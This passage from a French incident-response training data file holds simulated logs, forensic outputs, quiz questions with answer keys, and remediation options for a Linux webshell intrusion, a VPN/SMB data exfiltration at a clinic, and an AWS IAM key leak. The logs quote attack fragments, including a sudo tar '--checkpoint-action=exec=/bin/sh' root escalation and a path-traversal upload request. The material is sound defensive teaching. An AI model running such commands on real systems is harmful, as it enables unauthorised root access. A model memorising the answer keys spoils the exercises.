        output: `tcp ESTAB 0 0 172.16.20.14:49812 45.142.212.19:8443 users:((".cache-sync",pid=21904,fd=6))`,
      },
    ],
    questions: [
      {
        id: 'lnx-q1',
        prompt: 'Comment l’attaquant est-il entré initialement sur srv-pay-prod-02 ?',
        hint: 'Consultez Nginx access.log à 01:47:33.',
        options: [
          'Par force brute SSH sur le port 22 depuis 198.51.100.77',
          'Via un Path Traversal sur /api/v1/upload déposant healthz.php',
          'Via le compte bastion ops-deploy',
          'Via le service logrotate.service',
        ],
        correctIndex: 1,
        explanation:
          'Nginx access.log montre une requête POST /api/v1/upload?path=../../public/healthz.php (HTTP 200) depuis 185.220.101.47.',
        evidenceLogId: 'lnx-l2',
      },
      {
        id: 'lnx-q2',
        prompt: 'Par quel mécanisme www-data est-il passé root à 01:51:19 ?',
        hint: 'Regardez le journal auditd (EXECVE) et la commande sudo -l -U www-data.',
        options: [
          'Un exploit noyau dirty-pipe',
          'Une règle sudoers NOPASSWD sur /usr/bin/tar exploitée avec --checkpoint-action=exec',
          'Un mot de passe root vide dans /etc/shadow',
          'Une clé privée exposée dans HAProxy',
        ],
        correctIndex: 1,
        explanation:
          'auditd capture exactement sudo /usr/bin/tar ... --checkpoint-action=exec=/bin/sh exécuté avec uid=33 (www-data) -> euid=0 (root).',
        evidenceLogId: 'lnx-l4',
      },
      {
        id: 'lnx-q3',
        prompt: 'Quels sont les DEUX mécanismes de persistance mis en place par l’attaquant ?',
        hint: 'Vérifiez journalctl (01:54) et auditd FILE-WRITE (01:55).',
        options: [
          'Un service systemd (sys-telemetry-sync.service) et une clé SSH dans /root/.ssh/authorized_keys',
          'Une règle UFW et un job logrotate',
          'Un script Prometheus et un conteneur Docker',
          'Un alias bash et une tâche HAProxy',
        ],
        correctIndex: 0,
        explanation:
          'L’attaquant combine un service systemd redémarrant automatiquement /var/tmp/.cache-sync et une clé SSH backdoor (backup@ext-node) pour root.',
        evidenceLogId: 'lnx-l5',
      },
      {
        id: 'lnx-q4',
        prompt: 'Vers quelle IP et quel port le binaire malveillant émet-il son beaconing ?',
        hint: 'Consultez ufw.log et la commande ss -tupn.',
        options: [
          '10.40.1.30:9100',
          '198.51.100.77:22',
          '45.142.212.19:8443',
          '10.40.8.12:5432',
        ],
        correctIndex: 2,
        explanation:
          'ufw.log et ss -tupn confirment la session établie vers 45.142.212.19 sur TCP/8443.',
        evidenceLogId: 'lnx-l8',
      },
    ],
    remediationActions: [
      {
        id: 'lnx-r1',
        label: 'Isoler srv-pay-prod-02 du pool HAProxy et bloquer 45.142.212.19 + 185.220.101.47 en sortie/entrée',
        category: 'Confinement',
        isRecommended: true,
        rationale: 'Stoppe immédiatement le C2 et protège les flux clients sans perdre les artefacts disque.',
      },
      {
        id: 'lnx-r2',
        label: 'Stopper/désactiver sys-telemetry-sync.service, supprimer /var/tmp/.cache-sync et /public/healthz.php',
        category: 'Éradication',
        isRecommended: true,
        rationale: 'Élimine la persistance systemd et le webshell initial (après copie forensique).',
      },
      {
        id: 'lnx-r3',
        label: 'Purger la clé SSH backup@ext-node de /root/.ssh/authorized_keys et imposer PermitRootLogin no',
        category: 'Éradication',
        isRecommended: true,
        rationale: 'Ferme définitivement la porte dérobée SSH root.',
      },
      {
        id: 'lnx-r4',
        label: 'Retirer la règle sudo tar de www-data, corriger la validation d’upload et tourner les secrets .env / PostgreSQL',
        category: 'Récupération',
        isRecommended: true,
        rationale: 'Corrige les causes racines (Path Traversal + sudoers) et invalide tout secret potentiellement lu par root.',
      },
      {
        id: 'lnx-r5',
        label: 'Exécuter chmod 777 -R /var/www pour réparer les droits applicatifs',
        category: 'Récupération',
        isRecommended: false,
        rationale: 'Faille majeure : ouvrir tous les fichiers en écriture aggrave fortement la surface d’attaque.',
      },
      {
        id: 'lnx-r6',
        label: 'Se contenter de supprimer healthz.php sans inspecter systemd ni les clés SSH',
        category: 'Éradication',
        isRecommended: false,
        rationale: 'Insuffisant : l’attaquant conserverait un accès root persistant via systemd et SSH.',
      },
    ],
    postMortem: {
      rootCause:
        'Endpoint /api/v1/upload vulnérable au Path Traversal combiné à une règle sudoers NOPASSWD sur /usr/bin/tar pour www-data.',
      dwellTime: '11 minutes entre l’upload du webshell (01:47) et le premier beacon C2 (01:58).',
      keyIocs: [
        'IP Exploit : 185.220.101.47 · IP C2 : 45.142.212.19:8443',
        'Service malveillant : /etc/systemd/system/sys-telemetry-sync.service',
        'Binaire : /var/tmp/.cache-sync',
        'Clé SSH intruse : backup@ext-node dans /root/.ssh/authorized_keys',
      ],
      hardeningLessons: [
        'Appliquer le filtrage sortant (Egress UFW default deny outgoing) sur tous les serveurs DMZ.',
        'Monter /var/tmp et /tmp avec les options noexec,nosuid,nodev.',
        'Interdire tout droit sudo pour les comptes de service web (www-data) et activer AppArmor/SELinux.',
      ],
    },
  },
  {
    id: 'inc-vpn-smb-exfil',
    ticketId: 'INC-2026-043',
    title: 'Accès VPN Compromis & Exfiltration Massive sur Partage SMB Windows Server',
    domain: 'VPN & Windows Server',
    organization: 'Clinique Saint-Aurèle',
    sector: 'Santé & HDS',
    environment: 'Passerelle VPN WireGuard/IPSec + Windows Server 2022 (SRV-FS01)',
    severity: 'P1 — Critique',
    slaMinutes: 25,
    estimatedMinutes: 11,
    xpReward: 150,
    relatedCourseIds: [18, 30, 31],
    mitreTechniques: [
      { id: 'T1133', name: 'Services distants externes (VPN)' },
      { id: 'T1039', name: 'Collecte depuis partage réseau SMB' },
      { id: 'T1048', name: 'Exfiltration hors bande chiffrée' },
    ],
    summary:
      'Une connexion VPN réussit à 02h40 UTC depuis une adresse IP étrangère pour un médecin en congé, suivie de 1 420 accès fichiers en 4 minutes sur le partage sensible \\\\SRV-FS01\\Dossiers_Patients$.',
    initialAlert:
      'Alerte DLP & VPN #61028 : Connexion impossible-travel (Paris -> IP 194.26.135.88) pour dr.moreau + pic de transfert SMB 3,8 Go sur SRV-FS01.',
    businessImpact:
      'Violation potentielle de données de santé (RGPD / notification CNIL sous 72h) si l’exfiltration n’est pas interrompue.',
    assets: [
      {
        id: 'v-a1',
        name: 'GW-VPN-01',
        role: 'Concentrateur VPN IPSec/WireGuard',
        ip: '203.0.113.10',
        os: 'pfSense / StrongSwan',
        status: 'Suspect',
      },
      {
        id: 'v-a2',
        name: 'SRV-FS01',
        role: 'Serveur de fichiers Windows (SMB 3.1.1)',
        ip: '10.30.20.15',
        os: 'Windows Server 2022',
        status: 'Ciblé',
      },
      {
        id: 'v-a3',
        name: 'RADIUS-NPS-01',
        role: 'Serveur d’authentification RADIUS',
        ip: '10.30.10.8',
        os: 'Windows Server 2022',
        status: 'Nominal',
      },
    ],
    logs: [
      {
        id: 'vpn-l1',
        timestamp: '2026-11-25 02:35:04',
        source: 'VPN Gateway',
        host: 'GW-VPN-01',
        severity: 'INFO',
        eventCode: 'VPN-AUTH-OK',
        actor: 'astreinte.it',
        srcIp: '86.245.12.19',
        dstIp: '203.0.113.10',
        summary: 'Connexion VPN légitime (MFA TOTP validé) de l’administrateur d’astreinte depuis Paris.',
        rawPayload:
          '{"Event":"VPN_CONNECT","User":"astreinte.it","PeerIP":"86.245.12.19","Geo":"FR-Paris","MFA":"TOTP_VERIFIED","AssignedTunnelIP":"10.88.0.14"}',
        isEvidence: false,
        analystNote: 'Astreinte IT planifiée avec MFA validé depuis la France.',
      },
      {
        id: 'vpn-l2',
        timestamp: '2026-11-25 02:39:51',
        source: 'RADIUS NPS',
        host: 'RADIUS-NPS-01',
        severity: 'ALERTE',
        eventCode: '6272',
        actor: 'CLINIQUE\\dr.moreau',
        srcIp: '194.26.135.88',
        dstIp: '10.30.10.8',
        summary: 'Authentification VPN accordée SANS MFA (politique héritée Legacy-Medical-VPN) pour dr.moreau.',
        rawPayload:
          '{"EventID":6272,"User":"CLINIQUE\\\\dr.moreau","CallingStationId":"194.26.135.88","NPPolicy":"Legacy-Medical-VPN-NoMFA","AuthType":"MS-CHAPv2"}',
        isEvidence: true,
        killChainPhase: '1 · Contournement MFA & Accès VPN',
        analystNote: 'Preuve clé : politique RADIUS héritée sans MFA permettant une connexion depuis 194.26.135.88.',
      },
      {
        id: 'vpn-l3',
        timestamp: '2026-11-25 02:40:03',
        source: 'VPN Gateway',
        host: 'GW-VPN-01',
        severity: 'CRITIQUE',
        eventCode: 'VPN-CONNECT',
        actor: 'CLINIQUE\\dr.moreau',
        srcIp: '194.26.135.88',
        dstIp: '203.0.113.10',
        summary: 'Tunnel VPN attribué (10.88.0.42) à dr.moreau depuis un VPS anonyme (hors France) à 02h40.',
        rawPayload:
          '{"Event":"VPN_CONNECT","User":"dr.moreau","PeerIP":"194.26.135.88","Geo":"NL-Bulletproof-VPS","AssignedTunnelIP":"10.88.0.42","SplitTunnel":false}',
        isEvidence: true,
        killChainPhase: '2 · Établissement du tunnel compromis',
        analystNote: 'Preuve clé : tunnel IP 10.88.0.42 attribué à un utilisateur en congé depuis un hébergeur suspect.',
      },
      {
        id: 'vpn-l4',
        timestamp: '2026-11-25 02:41:18',
        source: 'Windows Security',
        host: 'SRV-FS01',
        severity: 'ALERTE',
        eventCode: '5140',
        actor: 'CLINIQUE\\dr.moreau',
        srcIp: '10.88.0.42',
        dstIp: '10.30.20.15',
        summary: 'Montage du partage SMB sensible \\\\SRV-FS01\\Dossiers_Patients$ depuis le tunnel 10.88.0.42.',
        rawPayload:
          '{"EventID":5140,"SubjectUserName":"dr.moreau","ShareName":"\\\\*\\\\Dossiers_Patients$","IpAddress":"10.88.0.42","AccessMask":"0x1"}',
        isEvidence: true,
        killChainPhase: '3 · Découverte & Accès au partage SMB',
        analystNote: 'Preuve clé : montage immédiat du partage de dossiers médicaux depuis le tunnel compromis.',
      },
      {
        id: 'vpn-l5',
        timestamp: '2026-11-25 02:42:05',
        source: 'Windows Security',
        host: 'SRV-FS01',
        severity: 'INFO',
        eventCode: '5140',
        actor: 'CLINIQUE\\inf.garde02',
        srcIp: '10.30.40.18',
        dstIp: '10.30.20.15',
        summary: 'Accès au partage \\\\SRV-FS01\\Plannings_Soins depuis le poste infirmier urgences.',
        rawPayload:
          '{"EventID":5140,"SubjectUserName":"inf.garde02","ShareName":"\\\\*\\\\Plannings_Soins","IpAddress":"10.30.40.18"}',
        isEvidence: false,
        analystNote: 'Activité normale du service des urgences de nuit.',
      },
      {
        id: 'vpn-l6',
        timestamp: '2026-11-25 02:43:49',
        source: 'Windows Security',
        host: 'SRV-FS01',
        severity: 'CRITIQUE',
        eventCode: '5145',
        actor: 'CLINIQUE\\dr.moreau',
        srcIp: '10.88.0.42',
        dstIp: '10.30.20.15',
        summary: 'Lecture séquentielle automatisée : 1 420 fichiers PDF/DICOM lus en 160 secondes dans \\Dossiers_Patients$\\2026\\.',
        rawPayload:
          '{"EventID":5145,"SubjectUserName":"dr.moreau","ShareName":"Dossiers_Patients$","RelativeTargetName":"2026\\\\export_archive_*.pdf","ReadCount":1420,"WindowSec":160,"IpAddress":"10.88.0.42"}',
        isEvidence: true,
        killChainPhase: '4 · Collecte automatisée de données',
        analystNote: 'Preuve clé : comportement scripté (1 420 fichiers en <3 min), impossible humainement.',
      },
      {
        id: 'vpn-l7',
        timestamp: '2026-11-25 02:45:12',
        source: 'NetFlow Firewall',
        host: 'GW-VPN-01',
        severity: 'CRITIQUE',
        eventCode: 'FLOW-ANOMALY',
        actor: '10.88.0.42',
        srcIp: '10.30.20.15',
        dstIp: '10.88.0.42',
        summary: 'Volume anormal sortant vers le pair VPN 194.26.135.88 : 3,84 Go transférés en 4 minutes.',
        rawPayload:
          '{"Flow":"SMB-OVER-VPN","SrcIP":"10.30.20.15","TunnelPeer":"10.88.0.42","RemotePublicIP":"194.26.135.88","BytesOut":4123168604,"DurationSec":240}',
        isEvidence: true,
        killChainPhase: '5 · Exfiltration via le tunnel VPN',
        analystNote: 'Preuve clé : 3,84 Go sortis directement à travers la passerelle VPN.',
      },
      {
        id: 'vpn-l8',
        timestamp: '2026-11-25 02:46:30',
        source: 'Windows Security',
        host: 'SRV-FS01',
        severity: 'INFO',
        eventCode: '4634',
        actor: 'CLINIQUE\\astreinte.it',
        srcIp: '10.88.0.14',
        dstIp: '10.30.20.15',
        summary: 'Fermeture de session normale de l’administrateur d’astreinte.',
        rawPayload:
          '{"EventID":4634,"TargetUserName":"astreinte.it","LogonType":3,"Status":"NormalLogoff"}',
        isEvidence: false,
        analystNote: 'Fin d’intervention normale de l’équipe IT.',
      },
    ],
    forensicCommands: [
      {
        id: 'vpn-cmd-1',
        tool: 'VPN CLI',
        command: 'vpnctl sessions --user dr.moreau',
        description: 'Vérifier la session VPN active et les octets transférés en temps réel.',
        output: `Session ID : tun-8842
User       : CLINIQUE\\dr.moreau
Tunnel IP  : 10.88.0.42  | Remote Peer : 194.26.135.88 (AS202425)
Policy     : Legacy-Medical-VPN-NoMFA (MFA = FALSE)
Traffic    : TX 3.84 GB / RX 14.2 MB  [ACTIF]`,
      },
      {
        id: 'vpn-cmd-2',
        tool: 'HR / Identity Check',
        command: 'id-check --user dr.moreau',
        description: 'Corréler le statut RH et les permissions NTFS du compte.',
        output: `Utilisateur : Dr. Claire Moreau (Radiologie)
Statut RH   : EN CONGÉ ANNUEL (20/11/2026 -> 02/12/2026)
Groupes AD  : GG_Medecins_All_Patients (Lecture sur TOUS les services au lieu de Radiologie uniquement)
Alerte      : Identifiant retrouvé dans un leak infostealer (RedLine) il y a 4 jours.`,
      },
      {
        id: 'vpn-cmd-3',
        tool: 'Windows Server SMB',
        command: 'Get-SmbOpenFile | Where-Object ClientComputerName -eq "10.88.0.42"',
        description: 'Lister les fichiers actuellement ouverts sur SRV-FS01 par la session suspecte.',
        output: `FileId        Path                                          ClientUserName
------        ----                                          --------------
9941201824    D:\\Shares\\Dossiers_Patients\\2026\\pat_8841.pdf CLINIQUE\\dr.moreau
9941201829    D:\\Shares\\Dossiers_Patients\\2026\\pat_8842.pdf CLINIQUE\\dr.moreau
Total ouvert : 18 handles actifs — lecture séquentielle en cours.`,
      },
      {
        id: 'vpn-cmd-4',
        tool: 'RADIUS Audit',
        command: 'Get-NpsNetworkPolicy | Select Name,Enabled,AuthMethods',
        description: 'Auditer les règles d’accès réseau sur le serveur NPS Windows.',
        output: `Name                      Enabled  AuthMethods
----                      -------  -----------
Corp-VPN-MFA-Required     True     EAP-TLS + TOTP
Legacy-Medical-VPN-NoMFA  True     MS-CHAPv2 (SANS MFA)  <-- VULNÉRABLE`,
      },
    ],
    questions: [
      {
        id: 'vpn-q1',
        prompt: 'Pourquoi l’attaquant a-t-il pu ouvrir un tunnel VPN sans code MFA ?',
        hint: 'Regardez RADIUS NPS Event 6272 et la commande Get-NpsNetworkPolicy.',
        options: [
          'La passerelle WireGuard était éteinte',
          'Une ancienne politique RADIUS (Legacy-Medical-VPN-NoMFA) en MS-CHAPv2 était encore active',
          'Le compte astreinte.it avait partagé son jeton TOTP',
          'Le serveur SRV-FS01 acceptait les connexions anonymes',
        ],
        correctIndex: 1,
        explanation:
          'Event 6272 prouve que la règle obsolète Legacy-Medical-VPN-NoMFA a validé la session sans MFA.',
        evidenceLogId: 'vpn-l2',
      },
      {
        id: 'vpn-q2',
        prompt: 'Quelle adresse IP interne de tunnel VPN est à l’origine de l’exfiltration SMB ?',
        hint: 'Corrélé entre VPN-CONNECT et Windows Security 5140/5145.',
        options: ['10.88.0.14', '10.30.40.18', '10.88.0.42', '10.30.10.8'],
        correctIndex: 2,
        explanation:
          'GW-VPN-01 a attribué 10.88.0.42 à la session compromise de dr.moreau, identique dans les logs 5140 et 5145.',
        evidenceLogId: 'vpn-l3',
      },
      {
        id: 'vpn-q3',
        prompt: 'Quel événement Windows Server prouve la lecture massive des fichiers médicaux ?',
        hint: 'Distinction entre montage de partage (5140) et accès détaillé aux objets fichiers (5145).',
        options: [
          'Event ID 4634 (Fermeture de session)',
          'Event ID 5145 montrant 1 420 fichiers lus en 160 secondes sur Dossiers_Patients$',
          'Event ID 6272 sur RADIUS-NPS-01',
          'Event ID 5140 sur Plannings_Soins',
        ],
        correctIndex: 1,
        explanation:
          'L’audit détaillé de partage Windows (Event ID 5145) enregistre l’accès automatisé à 1 420 fichiers en moins de 3 minutes.',
        evidenceLogId: 'vpn-l6',
      },
      {
        id: 'vpn-q4',
        prompt: 'Quel défaut de gouvernance AGDLP / moindres privilèges a amplifié l’impact ?',
        hint: 'Consultez la commande id-check --user dr.moreau.',
        options: [
          'Le compte avait accès à tous les dossiers de la clinique au lieu de son seul service Radiologie',
          'Le partage utilisait SMB 3.1.1 chiffré',
          'La clinique utilisait des sauvegardes hors ligne',
          'Le pare-feu collectait NetFlow',
        ],
        correctIndex: 0,
        explanation:
          'L’appartenance à GG_Medecins_All_Patients violait le principe du moindre privilège.',
        evidenceLogId: 'vpn-l6',
      },
    ],
    remediationActions: [
      {
        id: 'vpn-r1',
        label: 'Révoquer immédiatement la session VPN tun-8842 (10.88.0.42) et bloquer 194.26.135.88',
        category: 'Confinement',
        isRecommended: true,
        rationale: 'Interrompt sur-le-champ l’exfiltration des fichiers en cours.',
      },
      {
        id: 'vpn-r2',
        label: 'Désactiver le compte dr.moreau, révoquer ses jetons et réinitialiser son mot de passe',
        category: 'Confinement',
        isRecommended: true,
        rationale: 'Empêche toute reconnexion avec les identifiants volés par infostealer.',
      },
      {
        id: 'vpn-r3',
        label: 'Supprimer la politique Legacy-Medical-VPN-NoMFA et imposer MFA + certificat machine sur le VPN',
        category: 'Éradication',
        isRecommended: true,
        rationale: 'Supprime définitivement la faille de contournement MFA.',
      },
      {
        id: 'vpn-r4',
        label: 'Cloisonner les droits NTFS par service (AGDLP), activer la notification RGPD/CNIL (72h) et préserver les logs',
        category: 'Récupération',
        isRecommended: true,
        rationale: 'Réduit la surface future et respecte les obligations légales HDS / RGPD.',
      },
      {
        id: 'vpn-r5',
        label: 'Supprimer le partage Dossiers_Patients$ et formater SRV-FS01 pour cacher l’incident',
        category: 'Confinement',
        isRecommended: false,
        rationale: 'Catastrophique : provoque une perte de données cliniques et détruit les preuves légales.',
      },
      {
        id: 'vpn-r6',
        label: 'Laisser le tunnel actif 24h pour observer sans bloquer le transfert des dossiers',
        category: 'Confinement',
        isRecommended: false,
        rationale: 'Inacceptable sur des données de santé : l’exfiltration doit être coupée immédiatement.',
      },
    ],
    postMortem: {
      rootCause:
        'Identifiant volé (infostealer) réutilisé sur une règle VPN RADIUS héritée dépourvue de MFA, amplifié par des permissions SMB trop larges.',
      dwellTime: '5 minutes entre la connexion VPN (02:40) et la détection NetFlow (02:45).',
      keyIocs: [
        'IP distante : 194.26.135.88 · Tunnel interne : 10.88.0.42',
        'Politique vulnérable : Legacy-Medical-VPN-NoMFA',
        'Volume exfiltré : 3,84 Go (1 420 fichiers)',
      ],
      hardeningLessons: [
        'Supprimer toutes les exceptions VPN sans MFA et migrer vers WireGuard/IKEv2 avec certificats machines.',
        'Activer le géoblocage et l’accès conditionnel (blocage des comptes en congé longue durée).',
        'Segmenter les partages Windows Server selon le modèle AGDLP strict.',
      ],
    },
  },
  {
    id: 'inc-cloud-iam-s3',
    ticketId: 'INC-2026-044',
    title: 'Clé IAM CI/CD Exposée, Escalade de Rôle & Fuite de Bucket Cloud',
    domain: 'Cloud IAM',
    organization: 'LogiFlow SaaS',
    sector: 'Logistique Cloud B2B',
    environment: 'AWS Production · Compte 4910-8821-0092',
    severity: 'P2 — Élevée',
    slaMinutes: 45,
    estimatedMinutes: 11,
    xpReward: 150,
    relatedCourseIds: [27, 26, 14],
    mitreTechniques: [
      { id: 'T1552.001', name: 'Clé statique dans un dépôt Git' },
      { id: 'T1098.001', name: 'Création de clé d’accès persistante' },
      { id: 'T1530', name: 'Accès et ouverture publique Bucket S3' },
    ],
    summary:
      'GuardDuty déclenche une alerte d’utilisation anormale d’une clé d’accès CI/CD (AKIA...9F2Q) depuis une IP externe inconnue, suivie d’une création de nouvelle clé IAM et d’une modification de politique sur le bucket clients.',
    initialAlert:
      'GuardDuty Finding : UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration sur ci-deploy-bot -> PutBucketPolicy sur logiflow-exports-prod.',
    businessImpact:
      'Exposition publique potentielle de 42 000 factures clients B2B et création d’une persistance IAM silencieuse.',
    assets: [
      {
        id: 'c-a1',
        name: 'IAM::ci-deploy-bot',
        role: 'Compte technique pipeline CI/CD',
        ip: 'Cloud IAM',
        os: 'AWS IAM',
        status: 'Compromis',
      },
      {
        id: 'c-a2',
        name: 's3://logiflow-exports-prod',
        role: 'Bucket d’archives clients chiffrées',
        ip: 'eu-west-3',
        os: 'Amazon S3',
        status: 'Compromis',
      },
      {
        id: 'c-a3',
        name: 'GitHub::logiflow/infra-terraform',
        role: 'Dépôt Infrastructure as Code',
        ip: 'SaaS',
        os: 'GitHub Enterprise',
        status: 'Suspect',
      },
    ],
    logs: [
      {
        id: 'cld-l1',
        timestamp: '2026-11-25 09:12:04',
        source: 'GitHub Audit',
        host: 'github.com',
        severity: 'ALERTE',
        eventCode: 'repo.push',
        actor: 'dev-stagiaire',
        srcIp: '81.64.22.104',
        dstIp: '140.82.121.4',
        summary: 'Commit pushé sur un dépôt public temporaire contenant le fichier .env.backup (clé AKIA...9F2Q).',
        rawPayload:
          '{"action":"git.push","repo":"logiflow-labs/demo-scripts","visibility":"public","actor":"dev-stagiaire","secret_scanner":"AWS_ACCESS_KEY_DETECTED (AKIA5X92M81P9F2Q)"}',
        isEvidence: true,
        killChainPhase: '1 · Fuite de secret dans Git',
        analystNote: 'Preuve clé : une clé statique IAM a été poussée par erreur dans un dépôt public.',
      },
      {
        id: 'cld-l2',
        timestamp: '2026-11-25 09:14:22',
        source: 'CloudTrail',
        host: 'sts.eu-west-3',
        severity: 'INFO',
        eventCode: 'AssumeRole',
        actor: 'github-oidc-runner',
        srcIp: '20.199.39.22',
        dstIp: '52.95.156.10',
        summary: 'Exécution normale du pipeline OIDC déployant l’environnement staging.',
        rawPayload:
          '{"eventName":"AssumeRoleWithWebIdentity","userIdentity":"github-oidc-runner","roleArn":"arn:aws:iam::491088210092:role/staging-deploy","errorCode":null}',
        isEvidence: false,
        analystNote: 'Déploiement OIDC éphémère légitime.',
      },
      {
        id: 'cld-l3',
        timestamp: '2026-11-25 09:16:40',
        source: 'CloudTrail',
        host: 'sts.eu-west-3',
        severity: 'ALERTE',
        eventCode: 'GetCallerIdentity',
        actor: 'ci-deploy-bot',
        srcIp: '104.244.76.13',
        dstIp: '52.95.156.10',
        summary: 'Reconnaissance STS GetCallerIdentity via AKIA5X92M81P9F2Q depuis un nœud Tor/VPN (104.244.76.13).',
        rawPayload:
          '{"eventName":"GetCallerIdentity","accessKeyId":"AKIA5X92M81P9F2Q","sourceIPAddress":"104.244.76.13","userAgent":"aws-cli/2.15.0 Python/3.11 Linux"}',
        isEvidence: true,
        killChainPhase: '2 · Validation de clé par l’attaquant',
        analystNote: 'Preuve clé : 4 minutes après le push Git, un scanner automatisé teste la clé volée.',
      },
      {
        id: 'cld-l4',
        timestamp: '2026-11-25 09:18:05',
        source: 'CloudTrail',
        host: 'iam.amazonaws.com',
        severity: 'CRITIQUE',
        eventCode: 'CreateAccessKey',
        actor: 'ci-deploy-bot',
        srcIp: '104.244.76.13',
        dstIp: '52.95.156.10',
        summary: 'Création d’une seconde clé d’accès persistante (AKIA5X92BACKDOOR) sur le compte admin-recovery.',
        rawPayload:
          '{"eventName":"CreateAccessKey","userIdentity":"ci-deploy-bot","requestParameters":{"userName":"admin-recovery"},"responseElements":{"accessKeyId":"AKIA5X92BACKDOOR"},"sourceIPAddress":"104.244.76.13"}',
        isEvidence: true,
        killChainPhase: '3 · Persistance IAM (Backdoor AccessKey)',
        analystNote: 'Preuve clé : grâce à une policy iam:* trop large, l’attaquant crée une clé sur un autre compte.',
      },
      {
        id: 'cld-l5',
        timestamp: '2026-11-25 09:20:11',
        source: 'CloudTrail',
        host: 's3.eu-west-3',
        severity: 'CRITIQUE',
        eventCode: 'PutBucketPolicy',
        actor: 'ci-deploy-bot',
        srcIp: '104.244.76.13',
        dstIp: '52.95.156.10',
        summary: 'Modification de la Bucket Policy de logiflow-exports-prod autorisant Principal:"*" en s3:GetObject.',
        rawPayload:
          '{"eventName":"PutBucketPolicy","bucketName":"logiflow-exports-prod","policy":{"Effect":"Allow","Principal":"*","Action":"s3:GetObject","Resource":"arn:aws:s3:::logiflow-exports-prod/*"},"sourceIPAddress":"104.244.76.13"}',
        isEvidence: true,
        killChainPhase: '4 · Exposition publique du Bucket S3',
        analystNote: 'Preuve clé : le bucket sensible est rendu lisible par Internet entier.',
      },
      {
        id: 'cld-l6',
        timestamp: '2026-11-25 09:21:00',
        source: 'CloudTrail',
        host: 'ec2.eu-west-3',
        severity: 'INFO',
        eventCode: 'DescribeInstances',
        actor: 'monitoring-datadog',
        srcIp: '3.233.158.11',
        dstIp: '52.95.156.10',
        summary: 'Inventaire périodique d’instances par l’intégration Datadog.',
        rawPayload:
          '{"eventName":"DescribeInstances","userIdentity":"monitoring-datadog","sourceIPAddress":"3.233.158.11"}',
        isEvidence: false,
        analystNote: 'Collecteur SaaS de supervision autorisé.',
      },
      {
        id: 'cld-l7',
        timestamp: '2026-11-25 09:22:48',
        source: 'S3 Access Logs',
        host: 's3.eu-west-3',
        severity: 'CRITIQUE',
        eventCode: 'REST.GET.OBJECT',
        actor: 'Anonymous',
        srcIp: '104.244.76.13',
        dstIp: '52.95.156.10',
        summary: 'Téléchargement massif (186 objets) sur logiflow-exports-prod/factures-2026/ en accès anonyme.',
        rawPayload:
          '{"Operation":"REST.GET.OBJECT","Bucket":"logiflow-exports-prod","Key":"factures-2026/lot_01.tar.gz","RemoteIP":"104.244.76.13","HTTPStatus":200,"BytesSent":418902110}',
        isEvidence: true,
        killChainPhase: '5 · Exfiltration de données S3',
        analystNote: 'Preuve clé : exfiltration effective de 418 Mo de factures clients.',
      },
      {
        id: 'cld-l8',
        timestamp: '2026-11-25 09:24:10',
        source: 'WAF / API GW',
        host: 'api.logiflow.fr',
        severity: 'INFO',
        eventCode: 'WAF-BLOCK',
        actor: 'scanner-bot',
        srcIp: '45.155.205.91',
        dstIp: '52.95.156.20',
        summary: 'Requête SQLi générique bloquée sur /login par la règle AWS Managed Rules.',
        rawPayload:
          '{"Action":"BLOCK","Rule":"AWSManagedRulesSQLiRuleSet","ClientIP":"45.155.205.91","URI":"/login"}',
        isEvidence: false,
        analystNote: 'Bruit opportuniste déjà bloqué par le WAF.',
      },
    ],
    forensicCommands: [
      {
        id: 'cld-cmd-1',
        tool: 'AWS IAM CLI',
        command: 'aws iam list-attached-user-policies --user-name ci-deploy-bot',
        description: 'Auditer les permissions attachées au compte technique ci-deploy-bot.',
        output: `AttachedPolicies:
  - PolicyName: AdministratorAccess   [ALERTE CRITIQUE : Action "*" sur Resource "*"]
Note : Ce compte technique disposait de droits complets IAM + S3 sans condition IP.`,
      },
      {
        id: 'cld-cmd-2',
        tool: 'AWS IAM CLI',
        command: 'aws iam list-access-keys --user-name admin-recovery',
        description: 'Vérifier si une clé backdoor a été créée sur le compte de secours.',
        output: `AccessKeyMetadata:
  - AccessKeyId: AKIA5X92OLD0001  | Status: Active | CreateDate: 2025-01-10
  - AccessKeyId: AKIA5X92BACKDOOR | Status: Active | CreateDate: 2026-11-25T09:18:05Z  [INTRUSE]`,
      },
      {
        id: 'cld-cmd-3',
        tool: 'AWS S3 CLI',
        command: 'aws s3api get-public-access-block --bucket logiflow-exports-prod',
        description: 'Contrôler la protection Block Public Access du bucket.',
        output: `BlockPublicAcls       : false
IgnorePublicAcls      : false
BlockPublicPolicy     : false   <-- Permet PutBucketPolicy Principal:"*"
RestrictPublicBuckets : false`,
      },
    ],
    questions: [
      {
        id: 'cld-q1',
        prompt: 'Quelle est l’origine de la fuite de la clé AKIA5X92M81P9F2Q ?',
        hint: 'Regardez le premier événement GitHub Audit à 09:12:04.',
        options: [
          'Un vol physique dans le datacenter AWS',
          'Un commit accidentel du fichier .env.backup dans un dépôt GitHub public',
          'Une injection SQL réussie sur api.logiflow.fr',
          'L’intégration Datadog compromise',
        ],
        correctIndex: 1,
        explanation:
          'Le journal GitHub Audit indique que dev-stagiaire a poussé .env.backup sur un dépôt public contenant la clé statique.',
        evidenceLogId: 'cld-l1',
      },
      {
        id: 'cld-q2',
        prompt: 'Quelle persistance silencieuse l’attaquant crée-t-il à 09:18:05 ?',
        hint: 'Consultez CloudTrail CreateAccessKey.',
        options: [
          'Une nouvelle clé d’accès AKIA5X92BACKDOOR sur le compte admin-recovery',
          'Un rôle OIDC GitHub',
          'Une règle WAF AWS Managed',
          'Une instance EC2 de minage',
        ],
        correctIndex: 0,
        explanation:
          'Si l’équipe ne révoque que la clé de ci-deploy-bot, l’attaquant garde un accès complet via AKIA5X92BACKDOOR sur admin-recovery.',
        evidenceLogId: 'cld-l4',
      },
      {
        id: 'cld-q3',
        prompt: 'Comment les factures du bucket logiflow-exports-prod ont-elles été exfiltrées ?',
        hint: 'Corrélé entre PutBucketPolicy et REST.GET.OBJECT.',
        options: [
          'Par ouverture publique de la Bucket Policy (Principal:"*") suivie de téléchargements anonymes',
          'Par réplication vers Datadog',
          'Par accès SSH sur le bucket S3',
          'Par e-mail SMTP automatique',
        ],
        correctIndex: 0,
        explanation:
          'PutBucketPolicy a ouvert s3:GetObject à Principal:"*" car BlockPublicPolicy était désactivé, permettant le téléchargement anonyme.',
        evidenceLogId: 'cld-l5',
      },
      {
        id: 'cld-q4',
        prompt: 'Quelle architecture moderne élimine le risque de clés statiques AKIA en CI/CD ?',
        hint: 'Comparez ci-deploy-bot avec le log légitime à 09:14:22.',
        options: [
          'Stocker la clé dans un fichier README privé',
